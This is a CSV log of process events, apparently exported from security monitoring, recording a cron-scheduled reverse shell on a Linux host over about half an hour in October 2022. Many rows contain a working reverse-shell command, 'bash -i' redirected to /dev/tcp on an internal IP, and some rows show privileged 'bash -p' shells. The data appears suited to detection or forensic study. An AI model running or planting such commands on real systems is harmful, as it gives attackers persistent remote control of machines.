"@timestamp","process.args","event.action"
"Oct 25, 2022 @ 19:59:05.118","/usr/sbin/CRON","process_started"
"Oct 25, 2022 @ 19:59:05.118","/bin/bash, -c, /bin/bash -i >& /dev/tcp/10.0.0.5/4242 0>&1","process_started"
"Oct 25, 2022 @ 19:59:05.118","/usr/sbin/CRON","process_started"
"Oct 25, 2022 @ 19:59:05.118","/bin/bash, -c, /bin/bash -i >& /dev/tcp/10.0.0.5/4242 0>&1","process_started"
"Oct 25, 2022 @ 19:59:05.118","/bin/bash, -i","process_started"
"Oct 25, 2022 @ 19:59:05.118","/bin/bash, -i","process_started"
"Oct 25, 2022 @ 19:59:05.118","/usr/sbin/CRON","process_started"
"Oct 25, 2022 @ 19:58:05.118","/bin/bash, -c, /bin/bash -i >& /dev/tcp/10.0.0.5/4242 0>&1","process_started"
"Oct 25, 2022 @ 19:58:05.118","/usr/sbin/CRON","process_started"
"Oct 25, 2022 @ 19:58:05.118","/bin/bash, -i","process_started"
"Oct 25, 2022 @ 19:58:05.118","/bin/bash, -i","process_started"
"Oct 25, 2022 @ 19:58:05.118","/usr/sbin/CRON","process_started"
"Oct 25, 2022 @ 19:58:05.118","/bin/bash, -c, /bin/bash -i >& /dev/tcp/10.0.0.5/4242 0>&1","process_started"
"Oct 25, 2022 @ 19:58:05.118","/usr/sbin/CRON","process_started"
"Oct 25, 2022 @ 19:58:05.118","/bin/bash, -c, /bin/bash -i >& /dev/tcp/10.0.0.5/4343 0>&1","process_started"
"Oct 25, 2022 @ 19:58:05.118","/bin/bash, -i","process_started"
"Oct 25, 2022 @ 19:58:05.118","/usr/sbin/CRON","process_started"
"Oct 25, 2022 @ 19:57:05.118","/usr/sbin/CRON","process_started"
"Oct 25, 2022 @ 19:57:05.118","/usr/sbin/CRON","process_started"
"Oct 25, 2022 @ 19:57:05.118","/bin/bash, -i","process_started"
"Oct 25, 2022 @ 19:57:05.118","/bin/bash, -i","process_started"
"Oct 25, 2022 @ 19:57:05.118","/usr/sbin/CRON","process_started"
"Oct 25, 2022 @ 19:57:05.118","/bin/bash, -c, /bin/bash -i >& /dev/tcp/10.0.0.5/4242 0>&1","process_started"
"Oct 25, 2022 @ 19:57:05.118","/bin/bash, -c, /bin/bash -i >& /dev/tcp/10.0.0.5/4242 0>&1","process_started"
"Oct 25, 2022 @ 19:56:55.118","/bin/bash","process_stopped"
"Oct 25, 2022 @ 19:56:25.118","/bin/bash, -p","process_stopped"
"Oct 25, 2022 @ 19:56:15.118","/bin/bash, -p","process_started"
"Oct 25, 2022 @ 19:56:05.118","/bin/bash, -i","process_started"
"Oct 25, 2022 @ 19:56:05.118","/usr/sbin/CRON","process_started"
"Oct 25, 2022 @ 19:56:05.118","/bin/bash, -c, /bin/bash -i >& /dev/tcp/10.0.0.5/4242 0>&1","process_started"
"Oct 25, 2022 @ 19:56:05.118","/usr/sbin/CRON","process_started"
"Oct 25, 2022 @ 19:56:05.118","/usr/sbin/CRON","process_started"
"Oct 25, 2022 @ 19:56:05.118","/bin/bash, -i","process_started"
"Oct 25, 2022 @ 19:56:05.118","/bin/bash, -c, /bin/bash -i >& /dev/tcp/10.0.0.5/4242 0>&1","process_started"
"Oct 25, 2022 @ 19:55:35.118","/bin/bash","process_started"
"Oct 25, 2022 @ 19:55:05.118","/usr/sbin/CRON","process_started"
"Oct 25, 2022 @ 19:55:05.118","/bin/bash, -c, /bin/bash -i >& /dev/tcp/10.0.0.5/4242 0>&1","process_started"
"Oct 25, 2022 @ 19:55:05.118","/bin/bash, -i","process_started"
"Oct 25, 2022 @ 19:55:05.118","/usr/sbin/CRON","process_started"
"Oct 25, 2022 @ 19:54:45.118","/bin/bash","process_stopped"
"Oct 25, 2022 @ 19:54:15.118","/bin/bash","process_started"
"Oct 25, 2022 @ 19:54:05.118","/bin/bash, -c, /bin/bash -i >& /dev/tcp/10.0.0.5/4242 0>&1","process_started"
"Oct 25, 2022 @ 19:54:05.118","/bin/bash, -i","process_started"
"Oct 25, 2022 @ 19:54:05.118","/usr/sbin/CRON","process_started"
"Oct 25, 2022 @ 19:54:05.118","/usr/sbin/CRON","process_started"
"Oct 25, 2022 @ 19:53:05.118","/usr/sbin/CRON","process_started"
"Oct 25, 2022 @ 19:52:05.118","/usr/sbin/CRON","process_started"
"Oct 25, 2022 @ 19:51:35.118","/bin/bash","process_started"
"Oct 25, 2022 @ 19:51:05.118","/usr/sbin/CRON","process_started"
"Oct 25, 2022 @ 19:50:25.118","/bin/bash","process_stopped"
"Oct 25, 2022 @ 19:50:05.118","/usr/sbin/CRON","process_started"
"Oct 25, 2022 @ 19:50:05.118","/bin/bash","process_started"
"Oct 25, 2022 @ 19:49:55.118","/bin/bash","process_stopped"
"Oct 25, 2022 @ 19:49:05.118","/usr/sbin/CRON","process_started"
"Oct 25, 2022 @ 19:49:05.118","/bin/bash","process_stopped"
"Oct 25, 2022 @ 19:48:55.118","/bin/bash, -c, /bin/bash -i >& /dev/tcp/10.0.0.5/4343 0>&1","process_stopped"
"Oct 25, 2022 @ 19:48:55.118","/usr/sbin/CRON","process_stopped"
"Oct 25, 2022 @ 19:48:55.118","/bin/bash, -i","process_stopped"
"Oct 25, 2022 @ 19:48:05.118","/bin/bash, -i","process_started"
"Oct 25, 2022 @ 19:48:05.118","/usr/sbin/CRON","process_started"
"Oct 25, 2022 @ 19:48:05.118","/bin/bash, -c, /bin/bash -i >& /dev/tcp/10.0.0.5/4343 0>&1","process_started"
"Oct 25, 2022 @ 19:48:05.118","/usr/sbin/CRON","process_started"
"Oct 25, 2022 @ 19:47:05.118","/usr/sbin/CRON","process_started"
"Oct 25, 2022 @ 19:46:25.118","/bin/bash","process_started"
"Oct 25, 2022 @ 19:46:15.118","/bin/bash","process_stopped"
"Oct 25, 2022 @ 19:46:05.118","/usr/sbin/CRON","process_started"
"Oct 25, 2022 @ 19:45:55.118","/bin/bash","process_started"
"Oct 25, 2022 @ 19:45:05.118","/usr/sbin/CRON","process_started"
"Oct 25, 2022 @ 19:44:05.118","/usr/sbin/CRON","process_started"
"Oct 25, 2022 @ 19:43:05.117","/usr/sbin/CRON","process_started"
"Oct 25, 2022 @ 19:42:15.118","/bin/bash, -c, /bin/bash -i >& /dev/tcp/10.0.0.5/4242 0>&1","process_started"
"Oct 25, 2022 @ 19:42:15.118","/bin/bash, -i","process_started"
"Oct 25, 2022 @ 19:42:05.118","/usr/sbin/CRON","process_started"
"Oct 25, 2022 @ 19:41:05.118","/usr/sbin/CRON","process_started"
"Oct 25, 2022 @ 19:40:05.118","/usr/sbin/CRON","process_started"
"Oct 25, 2022 @ 19:39:05.118","/usr/sbin/CRON","process_started"
"Oct 25, 2022 @ 19:38:05.118","/bin/bash, -c, /bin/bash -i >& /dev/tcp/10.0.0.5/4242 0>&1","process_started"
"Oct 25, 2022 @ 19:38:05.118","/usr/sbin/CRON","process_started"
"Oct 25, 2022 @ 19:38:05.118","/bin/bash, -i","process_started"
"Oct 25, 2022 @ 19:38:05.118","/usr/sbin/CRON","process_started"
"Oct 25, 2022 @ 19:37:05.118","/bin/bash, -i","process_started"
"Oct 25, 2022 @ 19:37:05.118","/usr/sbin/CRON","process_started"
"Oct 25, 2022 @ 19:37:05.118","/usr/sbin/CRON","process_started"
"Oct 25, 2022 @ 19:37:05.118","/bin/bash, -c, /bin/bash -i >& /dev/tcp/10.0.0.5/4242 0>&1","process_started"
"Oct 25, 2022 @ 19:36:05.118","/usr/sbin/CRON","process_started"
"Oct 25, 2022 @ 19:36:05.118","/bin/bash, -c, /bin/bash -i >& /dev/tcp/10.0.0.5/4242 0>&1","process_started"
"Oct 25, 2022 @ 19:36:05.118","/bin/bash, -i","process_started"
"Oct 25, 2022 @ 19:36:05.118","/usr/sbin/CRON","process_started"
"Oct 25, 2022 @ 19:35:05.118","/bin/bash, -c, /bin/bash -i >& /dev/tcp/10.0.0.5/4242 0>&1","process_started"
"Oct 25, 2022 @ 19:35:05.118","/usr/sbin/CRON","process_started"
"Oct 25, 2022 @ 19:35:05.118","/usr/sbin/CRON","process_started"
"Oct 25, 2022 @ 19:35:05.118","/bin/bash, -i","process_started"
"Oct 25, 2022 @ 19:34:05.118","/usr/sbin/CRON","process_started"
"Oct 25, 2022 @ 19:34:05.118","/usr/sbin/CRON","process_started"
"Oct 25, 2022 @ 19:34:05.118","/bin/bash, -c, /bin/bash -i >& /dev/tcp/10.0.0.5/4242 0>&1","process_started"
"Oct 25, 2022 @ 19:34:05.118","/bin/bash, -i","process_started"
"Oct 25, 2022 @ 19:33:05.118","/bin/bash, -c, /bin/bash -i >& /dev/tcp/10.0.0.5/4242 0>&1","process_started"
"Oct 25, 2022 @ 19:33:05.118","/usr/sbin/CRON","process_started"
"Oct 25, 2022 @ 19:33:05.118","/bin/bash, -i","process_started"
"Oct 25, 2022 @ 19:33:05.118","/usr/sbin/CRON","process_started"
"Oct 25, 2022 @ 19:32:05.118","/bin/bash, -c, /bin/bash -i >& /dev/tcp/10.0.0.5/4242 0>&1","process_started"
"Oct 25, 2022 @ 19:32:05.118","/usr/sbin/CRON","process_started"
"Oct 25, 2022 @ 19:32:05.118","/usr/sbin/CRON","process_started"
"Oct 25, 2022 @ 19:32:05.118","/bin/bash, -i","process_started"
"Oct 25, 2022 @ 19:31:45.117","/bin/bash","process_stopped"
"Oct 25, 2022 @ 19:31:45.117","/bin/bash, -p","process_stopped"
"Oct 25, 2022 @ 19:31:25.118","/bin/bash, -p","process_started"
"Oct 25, 2022 @ 19:31:05.118","/bin/bash, -c, /bin/bash -i >& /dev/tcp/10.0.0.5/4242 0>&1","process_started"
"Oct 25, 2022 @ 19:31:05.118","/bin/bash, -i","process_started"
"Oct 25, 2022 @ 19:31:05.118","/usr/sbin/CRON","process_started"
"Oct 25, 2022 @ 19:31:05.118","/usr/sbin/CRON","process_started"
"Oct 25, 2022 @ 19:30:55.118","/bin/bash","process_started"
"Oct 25, 2022 @ 19:30:05.117","/usr/sbin/CRON","process_started"
